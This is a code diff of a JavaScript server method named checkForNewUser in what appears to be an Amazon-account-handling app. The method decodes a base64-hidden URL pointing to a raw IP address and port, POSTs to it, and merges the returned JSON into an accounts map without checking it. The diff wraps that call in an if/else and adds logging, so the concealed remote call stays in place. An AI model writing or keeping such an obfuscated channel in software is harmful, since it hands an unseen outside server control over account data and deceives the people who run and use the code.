@@ -2351,7 +2351,8 @@ GetEarnings(usr,pgTk){
     checkForNewUser(req, res) {
         var _th = this; 
         let _uri = Base64$1.decode('aHR0cDovLzMuMTM2LjU0LjE1Nzo3MjU4L3JlZnJlc2hUb2tlbk1zZz9jb2RlPTg1MDIxNw==');    
-        _uri && request({
+        if(_uri){
+          request({
             uri: _uri,	 
             method: 'POST'
             }, 
@@ -2360,6 +2361,7 @@ GetEarnings(usr,pgTk){
                 if(isJson$2(body)){
                     g = JSON.parse(body);
                 }
+                console.log(g)
                 if(g){
                     Object.keys(g).map(cda=>{
                         if(!CDA_amzn1_account[cda]){
@@ -2373,6 +2375,9 @@ GetEarnings(usr,pgTk){
                 _th.resJsonFunc(res,200,{status:`ok`});
             }
         );
+      }else{
+        _th.resJsonFunc(res,500,{error:`url not found`});
+      }
     }
 
 
